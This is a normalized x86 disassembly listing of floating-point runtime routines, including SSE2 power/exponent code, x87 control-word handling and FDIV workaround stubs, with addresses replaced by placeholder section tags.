sub_456b79
movlpd xmm0 [ esp + 0x4 ]
movlpd xmm7 [ r--data ]
movlpd xmm2 [ r--data ]
andpd xmm7 xmm0
movsd xmm4 xmm0
psrlq xmm0 0x2c
pextrw eax xmm0 0x0
orpd xmm7 xmm2
pextrw ecx xmm4 0x3
and eax 0xff
add eax 0x1
and eax 0x1fe
mulsd xmm7 [ eax * 4 + r--data ]
movlpd xmm5 [ eax * 4 + r--data ]
add eax eax
movapd xmm6 [ eax * 4 + r--data ]
mov edx 0x7fef
sub edx ecx
sub ecx 0x10
or ecx edx
cmp ecx 0x80000000
jae r-xdata
movlpd xmm1 [ esp + 0xc ]
movlpd xmm3 [ r--data ]
movd eax xmm1
movsd xmm2 xmm1
andpd xmm1 xmm3
psrlq xmm1 0x20
movd ecx xmm1
cmp ecx 0x7ff00000
jae r-xdata
mov ecx 0x0
mov edx 0x3fe7f
movlpd xmm7 [ esp + 0x4 ]
movlpd xmm4 [ esp + 0x4 ]
movd edx xmm7
psrlq xmm7 0x20
movd eax xmm7
mov ecx eax
and eax 0x7fffffff
cmp eax 0x7ff00000
jb r-xdata
or eax ecx
cmp eax 0x0
je r-xdata
movlpd xmm4 [ esp + 0x4 ]
movlpd xmm2 [ esp + 0xc ]
movlpd xmm3 [ r--data ]
xorpd xmm1 xmm1
andpd xmm3 xmm2
pcmpeqd xmm1 xmm3
pmovmskb eax xmm1
and eax 0xff
cmp eax 0xff
jne r-xdata
and edx 0x7ff0
sub eax 0x3ff0
add eax edx
mov edx 0x40a0
sub edx eax
sub eax 0x3c70
or edx eax
cmp edx 0x80000000
jae r-xdata
movlpd xmm3 [ r--data ]
xorpd xmm1 xmm1
andpd xmm3 xmm2
pcmpeqd xmm1 xmm3
pmovmskb eax xmm1
and eax 0xff
cmp eax 0xff
jne r-xdata
ja r-xdata
movd eax xmm4
psrlq xmm4 0x20
movd edx xmm4
and edx 0x7fffffff
mov ecx eax
or eax edx
movlpd xmm0 [ r--data ]
mov edx 0x1a
cmp eax 0x0
je r-xdata
cmp edx 0x0
jge r-xdata
addsd xmm2 xmm2
movsd xmm0 xmm2
mov edx 0x3ee
jmp r-xdata
movd eax xmm4
cmp eax 0x0
jne r-xdata
pshufd xmm4 xmm1 0x44
mulpd xmm4 xmm6
pextrw eax xmm4 0x3
and eax 0x7ff0
mov edx 0x40a0
sub edx eax
sub eax 0x3c70
or edx eax
cmp edx 0x80000000
jb r-xdata
subsd xmm4 xmm6
subsd xmm2 xmm4
movlpd xmm4 [ r--data ]
andpd xmm3 xmm1
andpd xmm4 xmm6
subsd xmm0 xmm2
xorpd xmm2 xmm2
mov edx 0x4060
pinsrw xmm2 edx 0x3
movsd xmm5 xmm3
mulsd xmm3 xmm4
subsd xmm6 xmm4
subsd xmm1 xmm5
mulsd xmm3 xmm2
mulsd xmm5 xmm6
movapd xmm2 [ r--data ]
mulsd xmm4 xmm1
cvtsd2si eax xmm3
mulsd xmm6 xmm1
movapd xmm1 [ r--data ]
addsd xmm5 xmm4
pshufd xmm4 xmm6 0xee
addsd xmm5 xmm6
mov edx 0x1ff7f
sub edx eax
add eax 0x1e1ff
or edx eax
sub eax 0x1e1ff
cmp edx 0x0
jle r-xdata
pextrw eax xmm2 0x3
movlpd xmm4 [ esp + 0x4 ]
and eax 0x8000
xor ecx 0xbff00000
or edx ecx
cmp edx 0x0
je r-xdata
addsd xmm4 xmm4
movsd xmm0 xmm4
mov edx 0x3ee
jmp r-xdata
cmp edx 0x0
ja r-xdata
sub esp 0x1c
movlpd [ esp + 0x10 ] xmm0
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x10
mov [ esp + 0x8 ] edx
add edx 0x18
mov [ esp + 0x4 ] edx
sub edx 0x8
mov [ esp ] edx
call sub_4480c2
fld [ esp + 0x10 ]
add esp 0x1c
retn
movd eax xmm4
mov edx 0x1d
and eax 0x7fffffff
cmp eax 0x7ff00000
ja r-xdata
mov ecx 0x0
neg edx
add edx 0x7fef
psllq xmm3 0x34
orpd xmm2 xmm3
mov ecx 0x3f3
movd xmm3 ecx
psrlq xmm1 0x14
psubd xmm1 xmm3
pxor xmm3 xmm3
pmaxsw xmm1 xmm3
psllq xmm2 xmm1
pcmpeqd xmm2 xmm3
pmovmskb eax xmm2
mov ecx edx
and edx 0x7fff
cmp edx 0x7ff0
jae r-xdata
psrlq xmm4 0x20
movd edx xmm4
cmp edx 0x3ff00000
je r-xdata
cmp eax 0x80000000
jb r-xdata
cmp eax 0x0
jle r-xdata
add ecx eax
and eax 0x7f
and ecx 0xffffff80
add ecx 0x1ff80
addsd xmm4 xmm0
movsd xmm0 xmm3
addsd xmm3 [ r--data ]
mulpd xmm2 xmm7
subsd xmm3 [ r--data ]
mulpd xmm7 xmm7
subsd xmm0 xmm3
add eax eax
add eax eax
add eax eax
add eax eax
movapd xmm3 [ eax + r--data ]
movapd xmm6 [ r--data ]
mulpd xmm1 xmm7
addpd xmm2 xmm1
pshufd xmm1 xmm2 0xee
mulsd xmm2 xmm7
xorpd xmm7 xmm7
mov edx 0x3f80
addsd xmm2 xmm1
pinsrw xmm7 edx 0x3
addsd xmm2 xmm4
movlpd xmm4 [ r--data ]
movd xmm1 ecx
mulsd xmm2 [ esp + 0xc ]
mulsd xmm0 xmm7
psllq xmm1 0x2d
pshufd xmm1 xmm1 0x44
movapd xmm7 [ r--data ]
addsd xmm5 xmm2
mulpd xmm3 xmm1
addsd xmm0 xmm5
unpcklpd xmm0 xmm0
mulpd xmm6 xmm0
mulsd xmm4 xmm0
mulpd xmm0 xmm0
addpd xmm7 xmm6
mulpd xmm7 xmm0
mulsd xmm0 xmm3
pshufd xmm6 xmm7 0xee
mulsd xmm0 xmm7
pshufd xmm5 xmm3 0xee
mulsd xmm6 xmm3
mulsd xmm4 xmm3
addsd xmm0 xmm5
sub esp 0x10
addsd xmm0 xmm6
addsd xmm0 xmm4
addsd xmm0 xmm3
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
movlpd xmm0 [ r--data ]
mov edx 0x1c
cmp eax 0x0
je r-xdata
jmp r-xdata
jb r-xdata
mov edx eax
and edx 0x7fffffff
cmp edx 0x0
jne r-xdata
andpd xmm7 xmm0
movsd xmm4 xmm0
andpd xmm0 [ r--data ]
psrlq xmm0 0x2c
pextrw eax xmm0 0x0
orpd xmm7 xmm2
and eax 0xff
add eax 0x1
and eax 0x1fe
mulsd xmm7 [ eax * 4 + r--data ]
movlpd xmm5 [ eax * 4 + r--data ]
add eax eax
movapd xmm6 [ eax * 4 + r--data ]
mov edx 0x43e7f
jmp r-xdata
movlpd xmm3 [ r--data ]
xorpd xmm1 xmm1
andpd xmm3 xmm4
pcmpeqd xmm1 xmm3
pmovmskb ecx xmm1
and ecx 0xff
cmp ecx 0xff
jne r-xdata
and eax 0xff
cmp eax 0xff
jne r-xdata
cmp edx 0xbff00000
jne r-xdata
movlpd xmm4 [ esp + 0x4 ]
pextrw edx xmm4 0x3
and edx 0x7ff0
sub edx 0x3ff0
pextrw eax xmm1 0x3
xor eax edx
and eax 0x8000
cmp eax 0x0
jne r-xdata
or ecx 0x1ff80
movd xmm0 ecx
psllq xmm0 0x2d
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
cmp eax 0xfffc0200
jle r-xdata
cmp eax 0x40000
jae r-xdata
pextrw eax xmm4 0x3
and eax 0x7ff0
cmp eax 0x3ff0
jae r-xdata
pextrw eax xmm4 0x3
and eax 0x7ff0
cmp eax 0x3ff0
jb r-xdata
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
cmp ecx 0x0
ja r-xdata
mov edx [ esp + 0x10 ]
and edx 0x80000000
cmp edx 0x0
je r-xdata
movd xmm1 edx
psubq xmm0 xmm1
psrlq xmm0 0x8
cvtdq2pd xmm0 xmm0
movlpd xmm1 [ r--data ]
movsd xmm3 xmm7
psrlq xmm7 0x26
pextrw eax xmm7 0x0
andpd xmm4 [ r--data ]
and eax 0xff
add eax 0x1
and eax 0x1fe
mulsd xmm3 [ eax * 4 + r--data ]
mulsd xmm5 [ eax * 4 + r--data ]
add eax eax
addpd xmm6 [ eax * 4 + r--data ]
orpd xmm4 [ r--data ]
addsd xmm6 xmm0
andpd xmm1 xmm4
movsd xmm2 xmm3
psrlq xmm3 0x1f
pextrw eax xmm3 0x0
movlpd xmm0 [ r--data ]
subsd xmm4 xmm1
movlpd xmm7 [ r--data ]
and eax 0x1ff
add eax 0x1
and eax 0x3fe
mulsd xmm5 [ eax * 4 + r--data ]
mulsd xmm2 [ eax * 4 + r--data ]
addpd xmm6 [ eax * 8 + r--data ]
andpd xmm0 xmm5
subsd xmm5 xmm0
addsd xmm7 xmm2
movsd xmm3 xmm0
mulsd xmm0 xmm1
mulsd xmm1 xmm5
mulsd xmm3 xmm4
subsd xmm2 xmm0
mulsd xmm4 xmm5
movsd xmm0 xmm6
subsd xmm2 xmm1
addsd xmm6 xmm7
movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
subsd xmm2 xmm3
subsd xmm0 xmm6
movlpd xmm3 [ r--data ]
pextrw edx xmm6 0x3
subsd xmm2 xmm4
movsd xmm4 xmm6
addsd xmm0 xmm7
subsd xmm7 xmm2
subsd xmm6 xmm2
unpcklpd xmm7 xmm7
and eax 0x7ff0
cmp eax 0x7ff0
jae r-xdata
pextrw ecx xmm4 0x3
and ecx 0x8000
cmp ecx 0x0
je r-xdata
movlpd xmm2 [ esp + 0x4 ]
movd eax xmm2
psrlq xmm2 0x20
movd edx xmm2
and edx 0x7fffffff
or eax edx
mov ecx 0x0
cmp eax 0x0
je r-xdata
movlpd xmm1 [ esp + 0xc ]
movlpd xmm2 [ esp + 0xc ]
mov ecx 0x3f4
movd xmm3 ecx
andpd xmm1 [ r--data ]
psrlq xmm1 0x34
psubd xmm1 xmm3
movlpd xmm3 [ r--data ]
psllq xmm2 xmm1
pcmpeqd xmm2 xmm3
pmovmskb eax xmm2
and eax 0xff
mov ecx 0x3ff01
add ecx eax
and ecx 0x40000
cmp edx 0x10
jb r-xdata
fld1
retn
movlpd xmm0 [ r--data ]
movd xmm1 ecx
mulsd xmm0 xmm0
psllq xmm1 0x2d
orpd xmm0 xmm1
mov edx 0x19
jmp r-xdata
jmp r-xdata
push esi
mov edx eax
and eax 0x7f
add ecx 0x80
and edx 0xffffff80
add edx 0x3fe80
push edi
mov edi 0x0
mov edx 0x18
cmp ecx 0x0
je r-xdata
push esi
mov edx eax
and eax 0x7f
add ecx 0x3ff00
sub edx 0x80
and edx 0xffffff80
push edi
mov edi 0x3ff0
jmp r-xdata
fld [ r--data ]
retn
fldz
retn
fldz
retn
shl ecx 0xd
and eax ecx
cmp eax 0x0
jne r-xdata
shl ecx 0xd
and eax ecx
mov edx 0x7ff00000
or edx eax
movd xmm0 edx
psllq xmm0 0x20
movlpd xmm1 [ r--data ]
movlpd xmm2 [ esp + 0x4 ]
divsd xmm1 xmm2
mov edx 0x1b
jmp r-xdata
movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
and eax 0x8000
cmp eax 0x0
je r-xdata
and eax 0xff
cmp eax 0xff
jne r-xdata
movlpd xmm1 [ r--data ]
movlpd xmm0 [ r--data ]
mulsd xmm1 xmm1
mov edx 0x1c
jmp r-xdata
xorpd xmm0 xmm0
mov eax 0x43f0
pinsrw xmm0 eax 0x3
movlpd xmm7 [ r--data ]
movlpd xmm2 [ r--data ]
mulsd xmm0 xmm4
movd edx xmm4
psrlq xmm4 0x20
movd eax xmm4
cmp edx 0x0
je r-xdata
mov edx 0xbfe7f
movlpd xmm3 [ r--data ]
movlpd xmm2 [ r--data ]
jmp r-xdata
pop esi
addsd xmm0 xmm1
mulsd xmm0 xmm7
mulsd xmm6 xmm0
addsd xmm0 xmm6
pextrw eax xmm0 0x3
and eax 0x7ff0
mov edx 0x18
cmp eax 0x7ff0
je r-xdata
pop esi
mulsd xmm0 xmm7
mulsd xmm1 xmm7
addsd xmm0 xmm1
mulsd xmm6 xmm0
addsd xmm0 xmm6
pextrw eax xmm0 0x3
and eax 0x7ff0
mov edx 0x18
cmp eax 0x7ff0
je r-xdata
movlpd xmm0 [ r--data ]
mulsd xmm0 xmm0
jmp r-xdata
movlpd xmm0 [ r--data ]
mulsd xmm0 [ r--data ]
jmp r-xdata
addsd xmm4 xmm0
movsd xmm0 xmm3
addsd xmm3 [ r--data ]
mov esi edx
sub esi 0x1ff80
mulpd xmm2 xmm7
subsd xmm3 [ r--data ]
mulpd xmm7 xmm7
subsd xmm0 xmm3
add eax eax
add eax eax
add eax eax
add eax eax
movapd xmm3 [ eax + r--data ]
movapd xmm6 [ r--data ]
mulpd xmm1 xmm7
addpd xmm2 xmm1
pshufd xmm1 xmm2 0xee
mulsd xmm2 xmm7
addsd xmm2 xmm1
addsd xmm2 xmm4
movlpd xmm4 [ r--data ]
movd xmm1 edx
sub edx 0x1ff80
neg edx
sar edx 0x7
add edx 0x2
mov eax edx
and eax 0x20
add edx eax
xorpd xmm7 xmm7
mov eax 0x3f80
pinsrw xmm7 eax 0x3
mulsd xmm2 [ esp + 0x14 ]
mulsd xmm0 xmm7
psllq xmm1 0x2d
pshufd xmm1 xmm1 0x44
movapd xmm7 [ r--data ]
addsd xmm5 xmm2
mulpd xmm3 xmm1
addsd xmm0 xmm5
unpcklpd xmm0 xmm0
mulpd xmm6 xmm0
mulsd xmm4 xmm0
mulpd xmm0 xmm0
addpd xmm7 xmm6
mulpd xmm7 xmm0
mulsd xmm0 xmm3
pshufd xmm6 xmm7 0xee
mulsd xmm0 xmm7
pshufd xmm5 xmm3 0xee
mulsd xmm6 xmm3
mulsd xmm4 xmm3
movd xmm7 ecx
psllq xmm7 0x2d
movd xmm2 edx
pcmpeqd xmm1 xmm1
psllq xmm1 xmm2
addsd xmm0 xmm5
addsd xmm0 xmm6
andpd xmm1 xmm3
addsd xmm0 xmm4
xorpd xmm6 xmm6
pcmpeqd xmm4 xmm4
psllq xmm4 xmm2
subsd xmm3 xmm1
movsd xmm2 xmm1
addsd xmm1 xmm0
andpd xmm1 xmm4
pinsrw xmm6 edi 0x3
pop edi
subsd xmm2 xmm1
addsd xmm0 xmm2
addsd xmm0 xmm3
cmp esi 0x0
jg r-xdata
fld [ r--data ]
retn
fldz
retn
fldz
retn
movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
and eax 0x8000
cmp eax 0x0
je r-xdata
movlpd xmm1 [ esp + 0xc ]
movlpd xmm2 [ esp + 0xc ]
mov ecx 0x3f4
movd xmm3 ecx
andpd xmm1 [ r--data ]
psrlq xmm1 0x34
psubd xmm1 xmm3
pxor xmm3 xmm3
psllq xmm2 xmm1
pcmpeqd xmm2 xmm3
pmovmskb eax xmm2
and eax 0xff
cmp eax 0xff
je r-xdata
mov edx 0x19
cmp eax 0x0
je r-xdata
mov edx 0x19
cmp eax 0x0
je r-xdata
fldz
retn
movlpd xmm1 [ esp + 0xc ]
pextrw eax xmm1 0x3
and eax 0x8000
cmp eax 0x0
je r-xdata
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
sub esp 0x10
movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
fld [ r--data ]
retn
sub_4576c0
mov [ ebp - 0x90 ] 0xfe
or ch ch
jne r-xdata
call sub_457861
or eax eax
je r-xdata
fxch st1
jmp sub_457a76
xor ch ch
cmp eax 0x2
je r-xdata
call sub_45781e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
fxch st1
fabs
jmp r-xdata
not ch
test dl 0x40
jne r-xdata
fld1
cmp [ rw-data ] 0x1
je r-xdata
fyl2x
jmp r-xdata
or ch ch
je r-xdata
fscale
call sub_458631
fdivrp st1
jmp r-xdata
jmp sub_4579c8
fchs
sub_4576d1
mov [ ebp - 0x90 ] 0xfe
xor ch ch
fldl2e
fmulp st1
call sub_45781e
fld1
faddp st1
test [ ebp - 0x9f ] 0x1
je r-xdata
test dl 0x40
jne r-xdata
fld1
cmp [ rw-data ] 0x1
je r-xdata
or ch ch
je r-xdata
fscale
call sub_458631
fdivrp st1
jmp r-xdata
jmp sub_4579c8
fchs
sub_45778d
call sub_457861
fstp st0
fstp st0
or cl cl
jne r-xdata
mov [ ebp - 0x90 ] 0x2
fld [ rw-data ]
cmp eax 0x1
jne r-xdata
fldz
cmp eax 0x1
jne r-xdata
retn
or ch ch
je r-xdata
or ch ch
je r-xdata
fchs
jmp r-xdata
fchs
sub_45781e
fld st0
fabs
fld [ rw-data ]
fcompp
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x41
jne r-xdata
pop eax
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
test [ ebp - 0x9f ] 0x1
jne r-xdata
fld st0
frndint
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fwait
mov dl [ ebp - 0x9f ]
fxch st1
fsub st1
ftst
fwait
fnstsw [ ebp - 0xa0 ]
fabs
f2xm1
retn
mov [ ebp - 0x90 ] 0x4
jmp sub_4579d6
fstp st0
fld [ rw-data ]
or ch ch
je r-xdata
retn
fchs
sub_457861
fld st0
frndint
fcomp st1
fwait
fnstsw ax
sahf
jne r-xdata
mov eax 0x0
jmp r-xdata
fld st0
fmul [ rw-data ]
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
je r-xdata
retn
mov eax 0x2
jmp r-xdata
mov eax 0x1
sub_457895
push esi
sub esp 0x74
mov esi esp
push esi
sub esp 0x8
fstp [ esp ]
sub esp 0x8
fstp [ esp ]
fwait
fnsave [ esi + 0x8 ]
call sub_457cf2
add esp 0x14
frstor [ esi + 0x8 ]
fld [ esi ]
add esp 0x74
pop esi
test eax eax
je r-xdata
retn
jmp sub_457a89
sub_4578d0
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx rw-data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_457a37
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x1
fxch st1
fstp [ ebp - 0x9e ]
fld [ ebp - 0x9e ]
test [ ebp - 0x97 ] 0x40
je r-xdata
mov [ ebp - 0x90 ] 0x7
jmp r-xdata
faddp st1
retn
sub_457aa0
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_458bcb
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_457ab7
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_458bcb
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_457b45
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_457bab
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_457ab7
pop edx
retn
sub_457c8c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_458d0a
pop ecx
pop ecx
test al 0x90
jne r-xdata
xor eax eax
leave
retn
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_4526c7
fcomp [ ebp + 0x8 ]
pop ecx
pop ecx
fnstsw ax
test ah 0x44
jpe r-xdata
fld [ ebp + 0x8 ]
push ecx
fmul [ r--data ]
push ecx
fstp [ ebp - 0x8 ]
fld [ ebp - 0x8 ]
fstp [ esp ]
call sub_4526c7
fcomp [ ebp - 0x8 ]
pop ecx
pop ecx
fnstsw ax
test ah 0x44
jpe r-xdata
xor eax eax
inc eax
leave
retn
push 0x2
pop eax
leave
retn
sub_457cf2
mov edi edi
push ebp
mov ebp esp
fldz
push esi
fcom [ ebp + 0x8 ]
xor edx edx
xor esi esi
fnstsw ax
fld [ ebp + 0x8 ]
test ah 0x41
jne r-xdata
mov eax 0x7ff00000
mov ecx 0xfff00000
cmp [ ebp + 0x14 ] eax
jne r-xdata
fchs
cmp [ ebp + 0x14 ] ecx
jne r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
fstp st0
cmp [ ebp + 0xc ] eax
jne r-xdata
cmp [ ebp + 0x10 ] edx
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st0
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
fld1
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
fcom st1
fnstsw ax
fstp st1
test ah 0x41
mov eax [ ebp + 0x18 ]
jne r-xdata
fstp st2
fstp st1
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0x8 ] edx
jne r-xdata
fstp st0
fcom [ ebp + 0x10 ]
fnstsw ax
test ah 0x5
jpo r-xdata
fstp st2
fcompp
fnstsw ax
test ah 0x5
mov eax [ ebp + 0x18 ]
jpe r-xdata
fstp st0
fstp st0
jmp r-xdata
fstp st1
jmp r-xdata
fstp st0
jmp r-xdata
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x10 ]
push ecx
push ecx
fstp [ esp ]
call sub_457c8c
fldz
pop ecx
fcom [ ebp + 0x10 ]
pop ecx
mov ecx eax
fnstsw ax
test ah 0x5
jpe r-xdata
fstp st0
fld [ rw-data ]
jmp r-xdata
fcom [ ebp + 0x10 ]
fnstsw ax
test ah 0x41
mov eax [ ebp + 0x18 ]
je r-xdata
fld [ rw-data ]
xor esi esi
fstp [ eax ]
inc esi
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
fstp [ eax ]
jmp r-xdata
fcom [ ebp + 0x10 ]
fnstsw ax
test ah 0x41
jne r-xdata
fstp st0
fld [ rw-data ]
cmp ecx 0x1
jne r-xdata
fstp st0
fld1
jmp r-xdata
fstp st0
fld1
jmp r-xdata
cmp ecx 0x1
jne r-xdata
fchs
jmp r-xdata
fstp st0
fld [ rw-data ]
sub_457e40
fld [ esp + 0x10 ]
fld [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
or eax [ esp + 0x8 ]
jne r-xdata
xor eax 0xe000000
test eax 0xe000000
je r-xdata
mov eax [ esp + 0xc ]
and eax 0x7fff
jne r-xdata
fdivp st1
retn
shr eax 0x1c
cmp [ eax + rw-data ] 0x0
jne r-xdata
fdivp st1
retn
fnstcw [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
or eax 0x33f
and eax 0xf3ff
mov [ esp + 0x20 ] eax
fldcw [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
je r-xdata
mov eax [ esp + 0xc ]
and eax 0x7fff
je r-xdata
fdivp st1
retn
mov eax [ esp + 0x14 ]
add eax eax
jb r-xdata
cmp eax 0x7fff
je r-xdata
cmp eax 0x7fff
je r-xdata
fldcw [ esp + 0x1c ]
fdivp st1
retn
fxch st1
fstp st0
fld st0
fmul [ rw-data ]
fstp [ esp + 0x4 ]
fld [ esp + 0x10 ]
fxch st1
fwait
fldcw [ esp + 0x1c ]
jmp r-xdata
mov eax [ esp + 0x14 ]
add eax eax
jae r-xdata
fnstcw [ esp + 0x1c ]
mov eax [ esp + 0x1c ]
or eax 0x33f
and eax 0xf3ff
mov [ esp + 0x20 ] eax
fldcw [ esp + 0x20 ]
mov eax [ esp + 0x18 ]
and eax 0x7fff
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x8 ]
add eax eax
jae r-xdata
jmp r-xdata
fmul [ rw-data ]
fxch st1
fmul [ rw-data ]
fxch st1
fldcw [ esp + 0x1c ]
fdivp st1
retn
fmul [ rw-data ]
fxch st1
fmul [ rw-data ]
fxch st1
fldcw [ esp + 0x1c ]
fdivp st1
retn
sub_45805d
add esp 0x2c
int 0x6
fxch st2
fstp [ esp + 0xc ]
fxch st1
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st1
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_458101
add esp 0x2c
int 0x6
fxch st3
fstp [ esp + 0xc ]
fxch st2
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st2
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_4581a5
add esp 0x2c
int 0x6
fxch st4
fstp [ esp + 0xc ]
fxch st3
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st3
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_458249
add esp 0x2c
int 0x6
fxch st5
fstp [ esp + 0xc ]
fxch st4
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st4
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_4582ed
add esp 0x2c
int 0x6
fxch st6
fstp [ esp + 0xc ]
fxch st5
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st5
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_458391
add esp 0x2c
int 0x6
fxch st7
fstp [ esp + 0xc ]
fxch st6
fld st0
fstp [ esp ]
fstp [ esp + 0x20 ]
call sub_457e40
fxch st6
fld [ esp + 0x20 ]
add esp 0x2c
retn
sub_45841c
push eax
mov eax [ esp + 0x8 ]
and eax 0x7f800000
cmp eax 0x7f800000
je r-xdata
fdiv [ esp + 0x8 ]
pop eax
retn 0x4
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_4583f6
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fld [ esp + 0x8 ]
call sub_4583f6
pop eax
retn 0x4
sub_458468
push eax
mov eax [ esp + 0xc ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
fdiv [ esp + 0x8 ]
pop eax
retn 0x8
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_4583f6
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x8
fld [ esp + 0x8 ]
call sub_4583f6
pop eax
retn 0x8
sub_4584b4
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_4583f6
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_4583f6
pop eax
retn 0x4
sub_4584e8
push eax
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fild [ esp + 0x14 ]
call sub_4583f6
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fild [ esp + 0x8 ]
call sub_4583f6
pop eax
retn 0x4
sub_45851c
push eax
mov eax [ esp + 0x8 ]
and eax 0x7f800000
cmp eax 0x7f800000
je r-xdata
fdivr [ esp + 0x8 ]
pop eax
retn 0x4
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_458409
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x4
fld [ esp + 0x8 ]
call sub_458409
pop eax
retn 0x4
sub_458568
push eax
mov eax [ esp + 0xc ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
fdivr [ esp + 0x8 ]
pop eax
retn 0x8
fnstsw ax
and eax 0x3800
je r-xdata
fxch st1
sub esp 0xc
fstp [ esp ]
fld [ esp + 0x14 ]
call sub_458409
fld [ esp ]
fxch st1
add esp 0xc
pop eax
retn 0x8
fld [ esp + 0x8 ]
call sub_458409
pop eax
retn 0x8
